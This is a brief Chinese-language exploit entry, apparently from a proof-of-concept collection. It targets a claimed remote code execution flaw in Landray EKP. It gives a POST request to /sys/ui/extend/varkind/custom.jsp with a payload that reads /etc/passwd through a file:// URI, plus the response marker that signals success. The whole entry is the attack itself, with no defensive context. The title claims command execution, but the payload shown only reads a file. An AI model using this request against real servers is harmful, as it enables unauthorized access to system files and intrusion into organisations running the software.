# 蓝凌EKP远程代码执行漏洞

蓝凌EKP远程 ｜ 命令执行 ｜ —
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`

**Payload**
```
var={"body":{"file":"file:///etc/passwd"}}
```
- **响应特征**：-1